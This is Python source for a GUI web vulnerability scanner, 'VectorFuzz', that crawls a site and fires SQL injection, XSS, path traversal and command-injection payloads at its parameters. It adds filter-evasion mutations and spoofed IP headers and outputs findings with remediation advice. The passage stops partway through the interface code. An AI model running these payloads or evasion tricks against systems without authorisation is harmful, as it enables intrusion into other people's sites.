import customtkinter as ctk
import tkinter as tk
from tkinter import filedialog, ttk
import requests
from bs4 import BeautifulSoup
import urllib.parse
import threading
import time
import os
import random
import json
import csv
import webbrowser
import queue
import re
import socket
import hashlib
import string
import platform
import html
from datetime import datetime
from difflib import SequenceMatcher
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys
import xml.etree.ElementTree as ET
sys.setrecursionlimit(10000)

try:
    from fpdf import FPDF
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

class Theme:
    BG_ROOT = '#050505'
    BG_SIDEBAR = '#080808'
    BG_CARD = '#101010'
    BG_CARD_HOVER = '#1A1A1A'
    BG_POPUP = '#141414'
    ACCENT_MAIN = '#00F0FF'
    ACCENT_HOVER = '#00BCD4'
    ACCENT_DIM = '#005F66'
    DANGER = '#FF003C'
    DANGER_DIM = '#660018'
    WARNING = '#FEE715'
    SUCCESS = '#00FF9D'
    TEXT_MAIN = '#FFFFFF'
    TEXT_SUB = '#888888'
    TEXT_DARK = '#000000'
    BORDER = '#252525'
    BORDER_FOCUS = '#444444'

class Fonts:
    MONO = ('Consolas', 11)
    MONO_SM = ('Consolas', 9)
    MAIN = ('Segoe UI', 12)
    HEADER = ('Segoe UI', 24, 'bold')
    SUBHEAD = ('Segoe UI', 14, 'bold')
    BOLD = ('Segoe UI', 12, 'bold')
    LABEL = ('Segoe UI', 11)

ctk.set_appearance_mode('Dark')
ctk.set_default_color_theme('dark-blue')

class VulnInfo:
    def __init__(self, name, severity, cwe, remediation):
        self.name = name
        self.severity = severity
        self.cwe = cwe
        self.remediation = remediation

class PayloadDatabase:
    def __init__(self):
        self.meta = {
            'SQLi': VulnInfo('SQL Injection', 'High', 'CWE-89', 'Use prepared statements (parameterized queries) to separate data from code.'),
            'XSS': VulnInfo('Cross-Site Scripting', 'Medium', 'CWE-79', 'Implement context-aware output encoding and Content Security Policy (CSP).'),
            'LFI': VulnInfo('Local File Inclusion', 'Critical', 'CWE-22', 'Validate user input against a strict whitelist of permitted filenames.'),
            'RCE': VulnInfo('Remote Code Execution', 'Critical', 'CWE-78', 'Avoid using shell execution functions; use safe language-specific APIs.'),
            'Blind': VulnInfo('Blind SQL Injection', 'Critical', 'CWE-89', 'Use prepared statements; disable verbose error messages in production.')
        }
        self.sqli_error = ["'", '"', "')", "');", '))', ';', '--', '#', "' OR '1'='1", '" OR "1"="1', "' OR 1=1--", "' OR 1=1#", "' UNION SELECT 1,version(),user(),4--", "admin' --", "admin' #", "' AND id IS NULL; --"]
        self.sqli_boolean = [("' AND 1=1 --", "' AND 1=0 --"), ('" AND 1=1 --', '" AND 1=0 --'), ("' AND 'a'='a", "' AND 'a'='b"), ('#', ' AND 0'), (' OR 1=1', ' OR 1=0')]
        self.sqli_time = ["'; WAITFOR DELAY '0:0:5'--", "'; SELECT SLEEP(5)--", "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))A)--", 'BENCHMARK(5000000,MD5(1))', 'pg_sleep(5)']
        self.xss = ["<script>alert('XSS')</script>", '"><script>alert(\'XSS\')</script>', '<img src=x onerror=alert(1)>', "' onmouseover='alert(1)", 'javascript:alert(1)', '<svg/onload=alert(1)>']
        self.lfi = ['../../../../etc/passwd', '..\\..\\..\\windows\\win.ini', '/etc/passwd', 'php://filter/convert.base64-encode/resource=index.php']
        self.rce = ['; ls -la', '| ls -la', '|| ls -la', '& ls -la', '$(ls -la)', '`ls -la`', '| ping -c 4 127.0.0.1']
        self.errors = {'MySQL': ['SQL syntax.*?MySQL', 'Warning.*mysql_.*', 'valid MySQL result'], 'PostgreSQL': ['PostgreSQL.*ERROR', 'Warning.*pg_.*', 'valid PostgreSQL result'], 'MSSQL': ['Driver.* SQL[\\-\\_\\ ]Server', 'OLE DB.* SQL Server', 'Unclosed quotation mark'], 'PHP': ['Fatal error', 'Warning: include', 'Uncaught exception']}

class MutationEngine:
    @staticmethod
    def url_encode(payload):
        return urllib.parse.quote(payload)

    @staticmethod
    def double_url_encode(payload):
        return urllib.parse.quote(urllib.parse.quote(payload))

    @staticmethod
    def sql_comment_obfuscation(payload):
        return payload.replace(' ', '/**/')

    @staticmethod
    def random_case(payload):
        return ''.join((random.choice([c.upper(), c.lower()]) for c in payload))

    @staticmethod
    def generate_variations(payload, level='Low'):
        variations = [payload]
        if level in ['Medium', 'High', 'Insane']:
            variations.append(MutationEngine.url_encode(payload))
            variations.append(MutationEngine.sql_comment_obfuscation(payload))
        if level in ['High', 'Insane']:
            variations.append(MutationEngine.double_url_encode(payload))
            variations.append(MutationEngine.random_case(payload))
        return variations

class ScannerLogic:
    def __init__(self, output_queue):
        self.queue = output_queue
        self.db = PayloadDatabase()
        self.lock = threading.Lock()
        self.stop_signal = False
        self.pause_event = threading.Event()
        self.pause_event.set()
        self.user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15', 'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0']
        self.stats = {'requests': 0, 'vulns': 0, 'crawled': 0, 'start_time': 0}

    def _get_headers(self, evasion='Low'):
        headers = {'User-Agent': random.choice(self.user_agents), 'Accept': '*/*', 'Connection': 'keep-alive'}
        if evasion in ['High', 'Insane']:
            fake_ip = f'{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}'
            headers['X-Forwarded-For'] = fake_ip
            headers['Client-IP'] = fake_ip
            headers['Referer'] = 'https://www.google.com'
        return headers

    def _log(self, text, level='info'):
        self.queue.put(('log', {'text': text, 'level': level}))

    def _add_vuln(self, v_type, url, payload, severity, info=None):
        with self.lock:
            self.stats['vulns'] += 1
        meta = info if info else self.db.meta.get('SQLi', VulnInfo('Unknown', severity, 'N/A', 'N/A'))
        self.queue.put(('vuln', {'type': v_type, 'url': url, 'payload': payload, 'severity': severity, 'cwe': meta.cwe, 'remediation': meta.remediation, 'time': datetime.now().strftime('%H:%M:%S')}))

    def crawl_robots_sitemap(self, domain_url, found_targets):
        try:
            robots_url = urllib.parse.urljoin(domain_url, '/robots.txt')
            res = requests.get(robots_url, timeout=5)
            if res.status_code == 200:
                self._log('[*] Found robots.txt. Parsing...', 'info')
                for line in res.text.splitlines():
                    if 'Disallow:' in line or 'Allow:' in line:
                        path = line.split(':')[1].strip()
                        full_url = urllib.parse.urljoin(domain_url, path)
                        found_targets.add(full_url)
            sitemap_url = urllib.parse.urljoin(domain_url, '/sitemap.xml')
            res = requests.get(sitemap_url, timeout=5)
            if res.status_code == 200:
                self._log('[*] Found sitemap.xml. Parsing...', 'info')
                try:
                    root = ET.fromstring(res.text)
                    for url in root.iter('{http://www.sitemaps.org/schemas/sitemap/0.9}loc'):
                        found_targets.add(url.text)
                except:
                    pass
        except:
            pass

    def crawl(self, start_url, depth=2):
        self._log(f'[*] Starting Enterprise Crawl on {start_url}', 'head')
        visited = set()
        queue_urls = queue.Queue()
        queue_urls.put((start_url, 0))
        found_targets = set()
        domain_url = f'{urllib.parse.urlparse(start_url).scheme}://{urllib.parse.urlparse(start_url).netloc}'
        self.crawl_robots_sitemap(domain_url, found_targets)
        try:
            domain = urllib.parse.urlparse(start_url).netloc
        except:
            return []
        while not queue_urls.empty() and (not self.stop_signal):
            self.pause_event.wait()
            curr_url, curr_depth = queue_urls.get()
            if curr_url in visited:
                continue
            visited.add(curr_url)
            if '?' in curr_url:
                found_targets.add(curr_url)
            if curr_depth >= depth:
                continue
            try:
                res = requests.get(curr_url, headers=self._get_headers(), timeout=5, verify=False)
                with self.lock:
                    self.stats['requests'] += 1
                soup = BeautifulSoup(res.text, 'html.parser')
                for tag in soup.find_all(['a', 'link'], href=True):
                    link = urllib.parse.urljoin(curr_url, tag['href'])
                    if urllib.parse.urlparse(link).netloc == domain:
                        queue_urls.put((link, curr_depth + 1))
                for form in soup.find_all('form', action=True):
                    action = urllib.parse.urljoin(curr_url, form['action'])
                    method = form.get('method', 'get').lower()
                    if urllib.parse.urlparse(action).netloc == domain:
                        inputs = form.find_all('input')
                        params = {}
                        for inp in inputs:
                            name = inp.get('name')
                            if name:
                                params[name] = 'TEST'
                        query = urllib.parse.urlencode(params)
                        found_targets.add(f'{action}?{query}')
            except Exception:
                pass
            with self.lock:
                self.stats['crawled'] = len(visited)
            self.queue.put(('stats', self.stats))
        return list(found_targets)

    def fuzz_url(self, url, options):
        session = requests.Session()
        if self.stop_signal:
            return
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
        except:
            return
        if not params:
            return
        try:
            base_res = session.get(url, headers=self._get_headers(), timeout=10)
            base_len = len(base_res.text)
            base_code = base_res.status_code
        except:
            return
        for param in params:
            original_val = params[param][0]
            attack_vectors = []
            if options['sqli']:
                attack_vectors.extend([(p, 'SQLi') for p in self.db.sqli_error])
            if options['xss']:
                attack_vectors.extend([(p, 'XSS') for p in self.db.xss])
            if options['lfi']:
                attack_vectors.extend([(p, 'LFI') for p in self.db.lfi])
            if options['rce']:
                attack_vectors.extend([(p, 'RCE') for p in self.db.rce])
            for raw_payload, v_cat in attack_vectors:
                if self.stop_signal:
                    return
                self.pause_event.wait()
                mutations = MutationEngine.generate_variations(raw_payload, options['evasion'])
                if options['evasion'] == 'Insane':
                    mutations.append(raw_payload)
                for payload in mutations:
                    new_params = params.copy()
                    if options['evasion'] == 'Insane' and payload == raw_payload:
                        new_params[param].append(payload)
                    else:
                        new_params[param] = [payload]
                    new_query = urllib.parse.urlencode(new_params, doseq=True)
                    target_url = parsed._replace(query=new_query).geturl()
                    try:
                        if options['delay'] > 0:
                            time.sleep(options['delay'])
                        start_t = time.time()
                        res = session.get(target_url, headers=self._get_headers(options['evasion']), timeout=10)
                        latency = time.time() - start_t
                        with self.lock:
                            self.stats['requests'] += 1
                        if v_cat == 'SQLi':
                            for db_type, regexes in self.db.errors.items():
                                for r in regexes:
                                    if re.search(r, res.text, re.I):
                                        self._add_vuln(f'SQLi ({db_type} Error)', target_url, payload, 'High', self.db.meta['SQLi'])
                                        return
                            if ('SLEEP' in payload.upper() or 'WAITFOR' in payload.upper()) and latency > 4.5:
                                self._add_vuln('Blind SQLi (Time-Based)', target_url, payload, 'Critical', self.db.meta['Blind'])
                                return
                        if v_cat == 'XSS' and payload in res.text:
                            if html.escape(payload) in res.text and payload not in res.text:
                                continue
                            self._add_vuln('Reflected XSS', target_url, payload, 'Medium', self.db.meta['XSS'])
                            return
                        if v_cat == 'LFI':
                            if 'root:x:0:0' in res.text or '[extensions]' in res.text:
                                self._add_vuln('LFI', target_url, payload, 'Critical', self.db.meta['LFI'])
                                return
                        if v_cat == 'RCE':
                            if 'uid=' in res.text and 'gid=' in res.text:
                                self._add_vuln('RCE', target_url, payload, 'Critical', self.db.meta['RCE'])
                                return
                    except requests.exceptions.ReadTimeout:
                        if 'SLEEP' in payload:
                            self._add_vuln('Blind SQLi (Timeout)', target_url, payload, 'Critical', self.db.meta['Blind'])
                    except Exception:
                        pass
            if options['evasion'] == 'Insane' and options['sqli']:
                h_payload = "' OR 1=1--"
                h_headers = self._get_headers('High')
                h_headers['User-Agent'] = h_payload
                try:
                    h_res = session.get(url, headers=h_headers, timeout=10)
                    if any((re.search(r, h_res.text, re.I) for r in self.db.errors['MySQL'])):
                        self._add_vuln('SQLi (User-Agent)', url, h_payload, 'High', self.db.meta['SQLi'])
                except:
                    pass

    def start_scan(self, target, options):
        self.stop_signal = False
        self.pause_event.set()
        self.stats = {k: 0 for k in self.stats}
        self.stats['start_time'] = time.time()
        self._log(f'--- INITIALIZING ENTERPRISE SCAN: {target} ---', 'head')
        if not target.startswith('http'):
            target = 'http://' + target
        if options['crawl']:
            self._log(f'[*] Advanced Crawl (Robots+Sitemap+Heuristic)...', 'info')
            targets = self.crawl(target, depth=options['depth'])
            self._log(f'[*] Crawl Complete. {len(targets)} endpoints identified.', 'success')
        else:
            targets = [target]
            if '?' not in target:
                targets = [target + '?id=1&q=test']
        self._log(f"[*] Launching Attacks ({options['threads']} Threads)...", 'head')
        with ThreadPoolExecutor(max_workers=options['threads']) as executor:
            futures = {executor.submit(self.fuzz_url, t, options): t for t in targets}
            completed = 0
            for f in as_completed(futures):
                if self.stop_signal:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                completed += 1
                try:
                    self.queue.put(('progress', completed / len(targets)))
                except ZeroDivisionError:
                    pass
        self._log('--- SCAN COMPLETED ---', 'head')
        self.queue.put(('done', None))

    def stop(self):
        self.stop_signal = True
        self.pause_event.set()

    def toggle_pause(self):
        if self.pause_event.is_set():
            self.pause_event.clear()
            return True
        else:
            self.pause_event.set()
            return False

class Reporter:
    @staticmethod
    def save_html(findings, target, filename):
        count_crit = len([f for f in findings if f['severity'] == 'Critical'])
        count_high = len([f for f in findings if f['severity'] == 'High'])
        count_med = len([f for f in findings if f['severity'] == 'Medium'])
        html_content = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>VectorFuzz Report [BGx] - {html.escape(target)}</title>
            <style>
                :root {{
                    --bg-dark: #050505;
                    --bg-card: #121212;
                    --bg-header: #0a0a0a;
                    --accent: #00F0FF;
                    --danger: #FF003C;
                    --warning: #FEE715;
                    --success: #00FF9D;
                    --text-main: #e0e0e0;
                    --text-sub: #888888;
                }}
                body {{
                    background-color: var(--bg-dark);
                    color: var(--text-main);
                    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                    margin: 0;
                    padding: 0;
                    overflow-x: hidden;
                }}
                .navbar {{
                    background: var(--bg-header);
                    padding: 15px 30px;
                    border-bottom: 1px solid #222;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                }}
                .navbar h1 {{ margin: 0; font-size: 1.5rem; letter-spacing: 1px; color: var(--accent); }}
                .navbar span {{ color: var(--text-sub); font-size: 0.9rem; }}
                
                .container {{ max-width: 1200px; margin: 30px auto; padding: 0 20px; }}
                
                /* DASHBOARD GRID */
                .stats-grid {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin-bottom: 40px;
                }}
                .stat-card {{
                    background: var(--bg-card);
                    padding: 20px;
                    border-radius: 8px;
                    border: 1px solid #222;
                    text-align: center;
                }}
                .stat-value {{ font-size: 2.5rem; font-weight: bold; margin: 10px 0; }}
                .stat-label {{ color: var(--text-sub); text-transform: uppercase; font-size: 0.8rem; letter-spacing: 1px; }}
                
                .crit-text {{ color: var(--danger); }}
                .high-text {{ color: var(--warning); }}
                .med-text {{ color: var(--accent); }}
                
                /* FINDINGS LIST */
                .finding-card {{
                    background: var(--bg-card);
                    margin-bottom: 20px;
                    border-radius: 6px;
                    overflow: hidden;
                    border: 1px solid #222;
                    transition: transform 0.2s;
                }}
                .finding-card:hover {{ transform: translateY(-2px); border-color: #333; }}
                
                .card-header {{
                    padding: 15px 20px;
                    display: flex;
                    align-items: center;
                    background: #181818;
                    cursor: pointer;
                }}
                .severity-indicator {{
                    width: 12px; height: 12px; border-radius: 50%;
                    margin-right: 15px;
                    box-shadow: 0 0 10px rgba(0,0,0,0.5);
                }}
                .sev-Critical {{ background: var(--danger); box-shadow: 0 0 8px var(--danger); }}
                .sev-High {{ background: var(--warning); box-shadow: 0 0 8px var(--warning); }}
                .sev-Medium {{ background: var(--accent); box-shadow: 0 0 8px var(--accent); }}
                
                .finding-title {{ font-weight: bold; font-size: 1.1rem; flex-grow: 1; }}
                .finding-meta {{ color: var(--text-sub); font-size: 0.9rem; margin-left: 20px; }}
                
                .card-body {{
                    padding: 20px;
                    border-top: 1px solid #222;
                    display: none; /* Collapsed by default */
                }}
                .card-body.open {{ display: block; animation: fadeIn 0.3s ease; }}
                
                .detail-row {{ margin-bottom: 15px; }}
                .detail-label {{ color: var(--text-sub); font-size: 0.85rem; margin-bottom: 5px; display: block; }}
                code {{
                    background: #000;
                    color: var(--success);
                    padding: 8px 12px;
                    border-radius: 4px;
                    font-family: 'Consolas', monospace;
                    display: block;
                    word-break: break-all;
                    border: 1px solid #222;
                }}
                .remediation-box {{
                    background: #1a1a1a;
                    padding: 15px;
                    border-left: 4px solid var(--accent);
                    margin-top: 20px;
                    color: #ddd;
                }}
                
                /* UTILS */
                .search-bar {{
                    width: 100%;
                    padding: 15px;
                    background: var(--bg-card);
                    border: 1px solid #333;
                    color: white;
                    border-radius: 6px;
                    margin-bottom: 20px;
                    font-size: 1rem;
                }}
                @keyframes fadeIn {{ from {{ opacity: 0; }} to {{ opacity: 1; }} }}
            </style>
        </head>
        <body>
            <div class="navbar">
                <h1>VectorFuzz <span style="color:white">// REPORT</span></h1>
                <span>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M')}</span>
            </div>
            
            <div class="container">
                <div class="stats-grid">
                    <div class="stat-card" style="border-bottom: 4px solid var(--danger)">
                        <div class="stat-value crit-text">{count_crit}</div>
                        <div class="stat-label">Critical Issues</div>
                    </div>
                    <div class="stat-card" style="border-bottom: 4px solid var(--warning)">
                        <div class="stat-value high-text">{count_high}</div>
                        <div class="stat-label">High Severity</div>
                    </div>
                    <div class="stat-card" style="border-bottom: 4px solid var(--accent)">
                        <div class="stat-value med-text">{count_med}</div>
                        <div class="stat-label">Medium Severity</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">{len(findings)}</div>
                        <div class="stat-label">Total Findings</div>
                    </div>
                </div>

                <input type="text" id="searchInput" class="search-bar" placeholder="Filter findings by URL or Type..." onkeyup="filterFindings()">

                <div id="findingsList">
        """
        if not findings:
            html_content += '<div style="text-align:center; padding: 50px; color:#666;"><h3>No Vulnerabilities Detected</h3><p>System appears secure against tested vectors.</p></div>'
        else:
            for i, f in enumerate(findings):
                html_content += f"""
                <div class="finding-card">
                    <div class="card-header" onclick="toggleCard({i})">
                        <div class="severity-indicator sev-{f['severity']}"></div>
                        <div class="finding-title">{html.escape(f['type'])}</div>
                        <div class="finding-meta">{html.escape(f.get('cwe', 'N/A'))}</div>
                        <div class="finding-meta" style="font-family:monospace">▼</div>
                    </div>
                    <div class="card-body" id="body-{i}">
                        <div class="detail-row">
                            <span class="detail-label">VULNERABLE URL</span>
                            <code style="color: var(--accent)">{html.escape(f['url'])}</code>
                        </div>
                        <div class="detail-row">
                            <span class="detail-label">INJECTED PAYLOAD</span>
                            <code>{html.escape(f['payload'])}</code>
                        </div>
                        <div class="remediation-box">
                            <strong>Remediation Strategy:</strong><br>
                            {html.escape(f.get('remediation', 'N/A'))}
                        </div>
                    </div>
                </div>
                """
        html_content += """
                </div>
            </div>
            <script>
                function toggleCard(id) {
                    var el = document.getElementById('body-' + id);
                    if(el.classList.contains('open')) el.classList.remove('open');
                    else el.classList.add('open');
                }
                
                function filterFindings() {
                    var input = document.getElementById('searchInput');
                    var filter = input.value.toUpperCase();
                    var container = document.getElementById("findingsList");
                    var cards = container.getElementsByClassName('finding-card');
                    
                    for (var i = 0; i < cards.length; i++) {
                        var text = cards[i].innerText || cards[i].textContent;
                        if (text.toUpperCase().indexOf(filter) > -1) {
                            cards[i].style.display = "";
                        } else {
                            cards[i].style.display = "none";
                        }
                    }
                }
            </script>
        </body>
        </html>
        """
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html_content)
            return True
        except:
            return False

    @staticmethod
    def save_json(findings, target, filename):
        data = {'target': target, 'date': str(datetime.now()), 'findings': findings}
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4)
            return True
        except:
            return False

    @staticmethod
    def save_pdf(findings, target, filename):
        if not PDF_AVAILABLE:
            return False
        pdf = FPDF()
        pdf.add_page()
        pdf.set_auto_page_break(auto=True, margin=15)
        pdf.set_font('Arial', 'B', 20)
        pdf.cell(0, 10, 'Security Scan Report', ln=True, align='C')
        pdf.set_font('Arial', '', 12)
        pdf.cell(0, 10, f"Target: {target} | Date: {datetime.now().strftime('%Y-%m-%d')}", ln=True, align='C')
        pdf.ln(10)
        for f in findings:
            pdf.set_font('Arial', 'B', 14)
            color = (255, 0, 0) if f['severity'] == 'Critical' else (255, 140, 0) if f['severity'] == 'High' else (0, 0, 255)
            pdf.set_text_color(*color)
            pdf.cell(0, 10, f"[{f['severity']}] {f['type']}", ln=True)
            pdf.set_font('Courier', '', 10)
            pdf.set_text_color(50, 50, 50)
            safe_url = f['url'].encode('latin-1', 'replace').decode('latin-1')
            safe_pay = f['payload'].encode('latin-1', 'replace').decode('latin-1')
            safe_rem = f.get('remediation', '').encode('latin-1', 'replace').decode('latin-1')
            pdf.multi_cell(0, 5, f'URL: {safe_url}')
            pdf.ln(2)
            pdf.multi_cell(0, 5, f'Payload: {safe_pay}')
            pdf.ln(2)
            pdf.multi_cell(0, 5, f'Fix: {safe_rem}')
            pdf.ln(5)
            pdf.line(10, pdf.get_y(), 200, pdf.get_y())
            pdf.ln(5)
        try:
            pdf.output(filename)
            return True
        except:
            return False

class CyberPopup(ctk.CTkToplevel):
    def __init__(self, master, title, message, mode='info', callback=None):
        super().__init__(master)
        if mode == 'error':
            self.border_color = Theme.DANGER
            self.icon_text = '!'
        elif mode == 'success':
            self.border_color = Theme.SUCCESS
            self.icon_text = '✓'
        else:
            self.border_color = Theme.ACCENT_MAIN
            self.icon_text = 'i'
        self.callback = callback
        self.geometry('400x220')
        self.overrideredirect(True)
        self.configure(fg_color=Theme.BG_ROOT)
        self.attributes('-topmost', True)
        self.update_idletasks()
        x = master.winfo_x() + master.winfo_width() // 2 - 200
        y = master.winfo_y() + master.winfo_height() // 2 - 110
        self.geometry(f'+{x}+{y}')
        self.main_frame = ctk.CTkFrame(self, fg_color=Theme.BG_POPUP, border_width=2, border_color=self.border_color, corner_radius=10)
        self.main_frame.pack(fill='both', expand=True, padx=2, pady=2)
        self.header = ctk.CTkFrame(self.main_frame, fg_color='transparent', height=40)
        self.header.pack(fill='x', padx=15, pady=10)
        self.lbl_title = ctk.CTkLabel(self.header, text=title.upper(), font=Fonts.BOLD, text_color=self.border_color)
        self.lbl_title.pack(side='left')
        self.content = ctk.CTkFrame(self.main_frame, fg_color='transparent')
        self.content.pack(fill='both', expand=True, padx=20, pady=5)
        self.lbl_icon = ctk.CTkLabel(self.content, text=self.icon_text, font=('Impact', 40), text_color=self.border_color)
        self.lbl_icon.grid(row=0, column=0, rowspan=2, padx=(0, 15))
        self.lbl_msg = ctk.CTkLabel(self.content, text=message, font=Fonts.MAIN, text_color=Theme.TEXT_MAIN, wraplength=280, justify='left')
        self.lbl_msg.grid(row=0, column=1, sticky='w')
        self.btn_frame = ctk.CTkFrame(self.main_frame, fg_color='transparent')
        self.btn_frame.pack(fill='x', padx=20, pady=15)
        if mode == 'confirm':
            self.btn_yes = ctk.CTkButton(self.btn_frame, text='CONFIRM', width=100, fg_color=Theme.DANGER, hover_color=Theme.DANGER_DIM, command=lambda: self.close(True))
            self.btn_yes.pack(side='right', padx=5)
            self.btn_no = ctk.CTkButton(self.btn_frame, text='CANCEL', width=100, fg_color=Theme.BORDER, hover_color=Theme.BORDER_FOCUS, command=lambda: self.close(False))
            self.btn_no.pack(side='right', padx=5)
        else:
            self.btn_ok = ctk.CTkButton(self.btn_frame, text='ACKNOWLEDGE', width=100, fg_color=self.border_color, text_color='black', hover_color=Theme.ACCENT_HOVER, command=lambda: self.close(True))
            self.btn_ok.pack(side='right')

    def close(self, result):
        self.destroy()
        if self.callback:
            self.callback(result)

class StatCard(ctk.CTkFrame):
    def __init__(self, master, title, initial_value, color, icon_text='📊'):
        super().__init__(master, fg_color=Theme.BG_CARD, corner_radius=8, border_width=1, border_color=Theme.BORDER)
        self.title = title
        self.color = color
        self.inner = ctk.CTkFrame(self, fg_color='transparent')
        self.inner.pack(expand=True, fill='both', padx=15, pady=15)
        self.top_row = ctk.CTkFrame(self.inner, fg_color='transparent')
        self.top_row.pack(fill='x')
        self.lbl_title = ctk.CTkLabel(self.top_row, text=title, font=Fonts.LABEL, text_color=Theme.TEXT_SUB)
        self.lbl_title.pack(side='left')
        self.lbl_icon = ctk.CTkLabel(self.top_row, text=icon_text, font=Fonts.LABEL, text_color=color)
        self.lbl_icon.pack(side='right')
        self.lbl_value = ctk.CTkLabel(self.inner, text=initial_value, font=('Segoe UI', 32, 'bold'), text_color=Theme.TEXT_MAIN)
        self.lbl_value.pack(anchor='w', pady=(5, 0))

    def update_value(self, value):
        self.lbl_value.configure(text=str(value))

class LogConsole(ctk.CTkFrame):
    def __init__(self, master, height=200):
        super().__init__(master, fg_color=Theme.BG_CARD, corner_radius=8, border_width=1, border_color=Theme.BORDER)
        self.tb = tk.Text(self, bg=Theme.BG_ROOT, fg='#CCCCCC', font=Fonts.MONO_SM, bd=0, highlightthickness=0, selectbackground=Theme.BORDER_FOCUS, height=10)
        self.scroll = ctk.CTkScrollbar(self, command=self.tb.yview, fg_color='transparent', button_color=Theme.BORDER)
        self.tb.configure(yscrollcommand=self.scroll.set)
        self.tb.pack(side='left', fill='both', expand=True, padx=2, pady=2)
        self.scroll.pack(side='right', fill='y', padx=2, pady=2)
        self._config_tags()

    def _config_tags(self):
        self.tb.tag_config('head', foreground=Theme.ACCENT_MAIN, font=Fonts.MONO)
        self.tb.tag_config('info', foreground=Theme.TEXT_MAIN)
        self.tb.tag_config('warn', foreground=Theme.WARNING)
        self.tb.tag_config('danger', foreground=Theme.DANGER, font=('Consolas', 10, 'bold'))
        self.tb.tag_config('success', foreground=Theme.SUCCESS)
        self.tb.tag_config('dim', foreground=Theme.TEXT_SUB)

    def log(self, text, level='info'):
        ts = datetime.now().strftime('%H:%M:%S')
        self.tb.insert('end', f'[{ts}] ', 'dim')
        self.tb.insert('end', f'{text}\n', level)
        self.tb.see('end')

    def clear(self):
        self.tb.delete('1.0', 'end')

class FindingWidget(ctk.CTkFrame):
    def __init__(self, master, data):
        color = Theme.DANGER if data['severity'] == 'Critical' else Theme.WARNING if data['severity'] == 'High' else Theme.ACCENT_MAIN
        super().__init__(master, fg_color=Theme.BG_CARD, border_color=color, border_width=1, corner_radius=6)
        self.data = data
        self.header = ctk.CTkFrame(self, fg_color='transparent')
        self.header.pack(fill='x', padx=10, pady=8)
        self.lbl_sev = ctk.CTkLabel(self.header, text=f"[{data['severity']}]", text_color=color, font=Fonts.BOLD, width=80, anchor='w')
        self.lbl_sev.pack(side='left')
        self.lbl_type = ctk.CTkLabel(self.header, text=data['type'], font=Fonts.MAIN, text_color=Theme.TEXT_MAIN)
        self.lbl_type.pack(side='left', padx=5)
        self.lbl_time = ctk.CTkLabel(self.header, text=data.get('time', ''), font=Fonts.MONO_SM, text_color=Theme.TEXT_SUB)
        self.lbl_time.pack(side='right')
        self.details = ctk.CTkFrame(self, fg_color='transparent')
        self.details.pack(fill='x', padx=10, pady=(0, 10))
        ctk.CTkLabel(self.details, text='URL:', font=Fonts.MONO_SM, text_color=Theme.TEXT_SUB, anchor='w').pack(fill='x')
        self.url_entry = ctk.CTkEntry(self.details, fg_color='#000', border_width=0, font=Fonts.MONO_SM, text_color=Theme.ACCENT_MAIN)
        self.url_entry.pack(fill='x', pady=(0, 5))
        self.url_entry.insert(0, data['url'])
        self.url_entry.configure(state='readonly')
        ctk.CTkLabel(self.details, text='Payload:', font=Fonts.MONO_SM, text_color=Theme.TEXT_SUB, anchor='w').pack(fill='x')
        self.pay_entry = ctk.CTkEntry(self.details, fg_color='#000', border_width=0, font=Fonts.MONO_SM, text_color=Theme.SUCCESS)
        self.pay_entry.pack(fill='x')
        self.pay_entry.insert(0, data['payload'])
        self.pay_entry.configure(state='readonly')

class App(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title('VectorFuzz Ultimate // BGx Edition')
        self.geometry('1300x850')
        self.minsize(1100, 700)
        self.configure(fg_color=Theme.BG_ROOT)
        self.queue = queue.Queue()
        self.scanner = ScannerLogic(self.queue)
        self.findings = []
        self.is_scanning = False
        self.is_paused = False
        self.start_time = 0
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)
        self._build_sidebar()
        self._build_main_area()
        self.bind('<Control-s>', lambda e: self.on_start())
        self.bind('<space>', lambda e: self.on_pause())
        self.after(100, self._process_queue)
        self.after(1000, self._update_timer)

    def _build_sidebar(self):
        self.sidebar = ctk.CTkFrame(self, width=280, corner_radius=0, fg_color=Theme.BG_SIDEBAR)
        self.sidebar.grid(row=0, column=0, sticky='nsew')
        self.sidebar.grid_propagate(False)
        branding = ctk.CTkFrame(self.sidebar, fg_color='transparent')
        branding.pack(fill='x', padx=20, pady=30)
        ctk.CTkLabel(branding, text='VECTOR', font=('Impact', 30), text_color=Theme.ACCENT_MAIN).pack(anchor='w')
        ctk.CTkLabel(branding, text='FUZZ', font=('Impact', 30), text_color='white').pack(anchor='w', pady=(0, 5))
        ctk.CTkLabel(branding, text='ULTIMATE EDITION v8', font=Fonts.MONO_SM, text_color=Theme.TEXT_SUB).pack(anchor='w')
        ctk.CTkFrame(self.sidebar, height=1, fg_color=Theme.BORDER).pack(fill='x', padx=20, pady=(0, 20))
        ctk.CTkLabel(self.sidebar, text='TARGET ACQUISITION', font=Fonts.LABEL, text_color=Theme.TEXT_SUB).pack(anchor='w', padx=20)
        self.entry_url = ctk.CTkEntry(self.sidebar, placeholder_text='http://target.com', height=40, fg_color=Theme.BG_ROOT, border_color=Theme.BORDER, text_color='white', font=Fonts.MONO)
        self.entry_url.pack(fill='x', padx=20, pady=(5, 20))
